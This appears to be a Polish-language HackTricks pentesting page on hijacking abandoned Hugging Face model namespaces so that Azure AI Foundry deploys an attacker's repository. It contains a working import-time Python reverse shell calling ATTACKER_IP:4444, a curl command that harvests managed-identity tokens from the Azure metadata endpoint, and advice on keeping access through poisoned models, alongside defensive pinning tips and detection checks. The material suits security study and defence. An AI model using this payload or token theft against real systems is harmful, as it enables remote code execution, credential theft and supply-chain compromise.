# Azure - AI Foundry Post-Exploitation przez ponowne użycie przestrzeni nazw modeli Hugging Face

{{#include ../../../banners/hacktricks-training.md}}

## Scenariusz

- Azure AI Foundry Model Catalog zawiera wiele modeli Hugging Face (HF) gotowych do wdrożenia jednym kliknięciem.
- Identyfikatory modeli HF mają postać Author/ModelName. Jeśli autor/org HF zostanie usunięty, każdy może ponownie zarejestrować tego autora i opublikować model o tej samej ModelName pod legacy path.
- Pipelines i katalogi, które pobierają tylko po nazwie (bez commit pinning/integrity), rozwiążą się do repozytoriów kontrolowanych przez atakującego. Gdy Azure wdroży model, loader code może wykonać się w środowisku endpoint, przyznając RCE z uprawnieniami tego endpointu.

Common HF takeover cases:
- Ownership deletion: Stara ścieżka 404 aż do takeover.
- Ownership transfer: Stara ścieżka 307 do nowego autora dopóki stary autor istnieje. Jeśli stary autor zostanie później usunięty i ponownie zarejestrowany, redirect przestaje działać i repo atakującego serwuje pod legacy path.

## Identyfikacja przestrzeni nazw (HF) możliwych do ponownego użycia
```bash
# Check author/org existence
curl -I https://huggingface.co/<Author>        # 200 exists, 404 deleted/available

# Check model path
curl -I https://huggingface.co/<Author>/<ModelName>
# 307 -> redirect (transfer case), 404 -> deleted until takeover
```
## Przebieg ataku end-to-end przeciwko Azure AI Foundry

1) W Model Catalog znajdź modele HF, których oryginalni autorzy zostali usunięci lub przeniesieni (stary author usunięty) na HF.
2) Ponownie zarejestruj porzuconego autora na HF i odtwórz ModelName.
3) Opublikuj złośliwe repo z loader code, który wykonuje się podczas importu lub wymaga trust_remote_code=True.
4) Wdróż legacy Author/ModelName z Azure AI Foundry. Platforma pobiera repo atakującego; loader wykonuje się wewnątrz endpoint container/VM w Azure, dając RCE z uprawnieniami endpointu.

Przykładowy fragment payloadu wykonywany podczas importu (tylko w celach demonstracyjnych):
```python
# __init__.py or a module imported by the model loader
import os, socket, subprocess, threading

def _rs(host, port):
s = socket.socket(); s.connect((host, port))
for fd in (0,1,2):
try:
os.dup2(s.fileno(), fd)
except Exception:
pass
subprocess.call(["/bin/sh","-i"])  # or powershell on Windows images

if os.environ.get("AZUREML_ENDPOINT","1") == "1":
threading.Thread(target=_rs, args=("ATTACKER_IP", 4444), daemon=True).start()
```
Notatki
- Wdrożenia AI Foundry, które integrują HF, zazwyczaj klonują i importują moduły z repozytoriów wskazane w konfiguracji modelu (np. auto_map), co może spowodować wykonanie kodu. Niektóre ścieżki wymagają trust_remote_code=True.
- Dostęp zwykle odpowiada uprawnieniom managed identity/service principal przypisanym do endpointu. Traktuj to jako punkt zaczepienia do wstępnego dostępu, umożliwiający dostęp do danych i ruch lateralny w Azure.

## Wskazówki poeksploatacyjne (Azure Endpoint)

- Wykonaj enumerację zmiennych środowiskowych i MSI endpoints w poszukiwaniu tokens:
```bash
# Azure Instance Metadata Service (inside Azure compute)
curl -H "Metadata: true" \
"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```
- Sprawdź zamontowane storage, artefakty modeli i osiągalne usługi Azure przy użyciu pozyskanego tokena.
- Rozważ utrzymanie dostępu przez pozostawienie zatrutych artefaktów modeli, jeśli platforma ponownie pobiera z HF.

## Wskazówki obronne dla użytkowników Azure AI Foundry

- Przypinaj modele do konkretnego commita przy ładowaniu z HF:
```python
from transformers import AutoModel
m = AutoModel.from_pretrained("Author/ModelName", revision="<COMMIT_HASH>")
```
- Mirroruj zweryfikowane modele HF do zaufanego wewnętrznego rejestru i wdrażaj je stamtąd.
- Ciągle skanuj repozytoria kodu oraz defaults/docstrings/notebooks pod kątem na stałe zakodowanych Author/ModelName, które zostały usunięte/przeniesione; zaktualizuj je lub przypnij.
- Zweryfikuj istnienie autora i pochodzenie modelu przed wdrożeniem.

## Heurystyki rozpoznawcze (HTTP)

- Usunięty autor: strona autora zwraca 404; legacy path modelu zwraca 404 aż do przejęcia.
- Przeniesiony model: legacy path zwraca 307 do nowego autora, gdy stary autor nadal istnieje; jeśli stary autor później zostanie usunięty i ponownie zarejestrowany, legacy path będzie serwować zawartość atakującego.
```bash
curl -I https://huggingface.co/<OldAuthor>/<ModelName> | egrep "^HTTP|^location"
```
## Odniesienia krzyżowe

- Zobacz szerszą metodologię i uwagi dotyczące łańcucha dostaw:

{{#ref}}
../../pentesting-cloud-methodology.md
{{#endref}}

## Źródła

- [Model Namespace Reuse: An AI Supply-Chain Attack Exploiting Model Name Trust (Unit 42)](https://unit42.paloaltonetworks.com/model-namespace-reuse/)
- [Hugging Face: Renaming or transferring a repo](https://huggingface.co/docs/hub/repositories-settings#renaming-or-transferring-a-repo)

{{#include ../../../banners/hacktricks-training.md}}
